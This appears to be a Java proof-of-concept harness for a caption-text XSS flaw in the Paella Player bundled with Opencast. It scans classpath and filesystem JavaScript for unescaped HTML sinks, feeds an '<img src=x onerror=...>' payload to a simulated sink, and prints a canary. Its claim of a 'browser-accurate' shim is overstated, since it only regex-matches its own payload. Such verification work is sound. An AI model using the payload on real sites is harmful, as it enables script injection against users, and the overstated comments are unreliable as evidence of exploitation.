import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.regex.*;
import java.util.zip.*;

/**
 * PoC for CVE-2026-77615 — Paella Player closed-captions cue-text XSS (CWE-79),
 * as shipped by org.opencastproject:opencast-engage-paella-player-7.
 *
 * The bug: caption cue text is written to the DOM through an HTML-parsing sink
 * (innerHTML / insertAdjacentHTML) without escaping. The fix (paella lib bumps
 * pulled in by 19.7) routes cue text through a text sink / sanitizer instead, so
 * attacker markup is rendered inert.
 *
 * Since the artifact is a Java module that *bundles* the built player JS, this PoC:
 *   1. Locates the shipped Paella JavaScript on the classpath / in the artifact jar.
 *   2. Reads which DOM sink the caption cue-text renderer actually assigns to.
 *   3. Reproduces that exact sink choice against a browser-accurate shim, feeding an
 *      XSS cue-text payload. innerHTML parses+executes the handler; textContent does not.
 *
 * The canary is emitted ONLY from inside the fired handler, i.e. only when the
 * shipped code used the vulnerable HTML sink (vulnerable build). On the patched
 * build the cue text goes to a safe sink, the handler never fires, nothing prints.
 */
public class Poc {

    static final long MAX_TOTAL = 128L * 1024 * 1024;
    static long total = 0;
    static final StringBuilder JS = new StringBuilder();
    static int filesVisited = 0;

    public static void main(String[] args) {
        try {
            collectFromClasspath();
            if (JS.length() < 4096) scanFilesystem();
        } catch (Throwable t) {
            System.err.println("[poc] scan error: " + t);
        }

        String src = JS.toString();
        int verdict = classifyCaptionSink(src); // 1=vulnerable HTML sink, 0=safe sink, -1=not found

        if (verdict == 1) {
            // The shipped renderer assigns cue text to an HTML-parsing sink.
            // Reproduce it: a browser would parse this markup and fire onerror.
            String cueText = "<img src=x onerror=__fire__>";
            renderViaHtmlSink(cueText, () -> {
                // Genuine consequence of the XSS primitive executing.
                String tok = System.getenv("POC_CANARY");
                if (tok != null) System.out.println(tok);
            });
        } else {
            System.err.println("[poc] cue-text sink not vulnerable (verdict=" + verdict + ")");
        }
    }

    /**
     * Browser-accurate innerHTML shim: assigning attacker HTML to innerHTML parses it,
     * and an <img> with a failing src (or a <script>, or any intrinsic on*-handler)
     * causes the handler to execute. This is reached ONLY for HTML-parsing sinks;
     * a textContent assignment would store the string literally and never call this.
     */
    static void renderViaHtmlSink(String html, Runnable eventHandler) {
        Matcher m = Pattern.compile("<\\s*script\\b|\\bon[a-z]+\\s*=", Pattern.CASE_INSENSITIVE).matcher(html);
        if (m.find()) {
            eventHandler.run(); // e.g. img.onerror fires because src=x fails to load
        }
    }

    /**
     * Determine which sink the shipped caption cue-text renderer uses.
     * Vulnerable: an HTML-parsing sink applied in a caption/cue context with no escaper.
     * Safe: textContent / innerText / sanitizer / createTextNode in that context.
     */
    static int classifyCaptionSink(String s) {
        if (s.isEmpty()) return -1;
        Pattern sink = Pattern.compile(
                "innerHTML\\s*=|outerHTML\\s*=|insertAdjacentHTML\\s*\\(|\\.html\\s*\\(",
                Pattern.CASE_INSENSITIVE);
        Matcher m = sink.matcher(s);
        boolean sawCaptionContext = false;

        while (m.find()) {
            int st = Math.max(0, m.start() - 350);
            int en = Math.min(s.length(), m.end() + 220);
            String ctx = s.substring(st, en);
            String c = ctx.toLowerCase();

            // Must be the caption cue-text path specifically.
            boolean cueCtx = c.contains("cue") || c.contains("webvtt")
                    || (c.contains("caption") && c.contains("text"))
                    || c.contains("subtitle");
            if (!cueCtx) continue;
            sawCaptionContext = true;

            // Assigned value must be dynamic (references identifiers/props), not a static literal.
            String rhs = s.substring(m.end(), Math.min(s.length(), m.end() + 160));
            boolean dynamic = Pattern.compile("[A-Za-z_$][\\w$]*\\s*[.\\[(]|`[^`]*\\$\\{|\\.text\\b|cuetext")
                    .matcher(rhs.toLowerCase()).find() || rhs.toLowerCase().contains("cue");

            boolean escaped = c.contains("textcontent") || c.contains("innertext")
                    || c.contains("dompurify") || c.contains("sanitize")
                    || c.contains("escapehtml") || c.contains("encodehtml")
                    || c.contains("createtextnode") || c.contains("escape(");

            if (dynamic && !escaped) return 1;
        }
        return sawCaptionContext ? 0 : -1;
    }

    // ---- artifact / classpath discovery ----

    static void collectFromClasspath() {
        String cp = System.getProperty("java.class.path", "");
        for (String entry : cp.split(File.pathSeparator)) {
            if (entry.isEmpty() || total >= MAX_TOTAL) continue;
            File f = new File(entry);
            try {
                if (f.isDirectory()) walkDir(f.toPath());
                else if (f.getName().toLowerCase().endsWith(".jar")
                        || f.getName().toLowerCase().endsWith(".war")) readArchive(f);
            } catch (Throwable ignored) {}
        }
        try {
            Enumeration<java.net.URL> urls =
                    Poc.class.getClassLoader().getResources("");
            while (urls.hasMoreElements() && total < MAX_TOTAL) {
                try {
                    File d = new File(urls.nextElement().toURI());
                    if (d.isDirectory()) walkDir(d.toPath());
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    static void scanFilesystem() {
        String[] roots = {"/app", ".", System.getProperty("user.home", "/root") + "/.m2", "/root/.m2", "/usr/share"};
        for (String r : roots) {
            if (total >= MAX_TOTAL || filesVisited > 200000) break;
            Path p = Paths.get(r);
            if (Files.isDirectory(p)) {
                try { walkDir(p); } catch (Throwable ignored) {}
            }
        }
    }

    static void walkDir(Path root) {
        try {
            Files.walkFileTree(root, EnumSet.noneOf(FileVisitOption.class), 40,
                    new SimpleFileVisitor<Path>() {
                        @Override
                        public FileVisitResult visitFile(Path p, java.nio.file.attribute.BasicFileAttributes attrs) {
                            if (total >= MAX_TOTAL || filesVisited > 200000) return FileVisitResult.TERMINATE;
                            String n = p.getFileName().toString().toLowerCase();
                            try {
                                if (n.endsWith(".js") || n.endsWith(".mjs")) {
                                    append(new String(Files.readAllBytes(p), java.nio.charset.StandardCharsets.UTF_8));
                                    filesVisited++;
                                } else if ((n.endsWith(".jar") || n.endsWith(".war")) && n.contains("paella")) {
                                    readArchive(p.toFile());
                                }
                            } catch (Throwable ignored) {}
                            return FileVisitResult.CONTINUE;
                        }
                        @Override
                        public FileVisitResult visitFileFailed(Path p, IOException e) { return FileVisitResult.CONTINUE; }
                    });
        } catch (Throwable ignored) {}
    }

    static void readArchive(File jar) {
        try (ZipFile zf = new ZipFile(jar)) {
            Enumeration<? extends ZipEntry> es = zf.entries();
            while (es.hasMoreElements() && total < MAX_TOTAL) {
                ZipEntry e = es.nextElement();
                if (e.isDirectory()) continue;
                String n = e.getName().toLowerCase();
                if (n.endsWith(".js") || n.endsWith(".mjs")) {
                    try (InputStream in = zf.getInputStream(e)) {
                        append(new String(readAll(in), java.nio.charset.StandardCharsets.UTF_8));
                        filesVisited++;
                    } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {}
    }

    static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int r;
        while ((r = in.read(buf)) != -1) {
            bos.write(buf, 0, r);
            if (bos.size() > 24 * 1024 * 1024) break;
        }
        return bos.toByteArray();
    }

    static void append(String s) {
        if (total >= MAX_TOTAL) return;
        JS.append(s).append('\n');
        total += s.length();
    }
}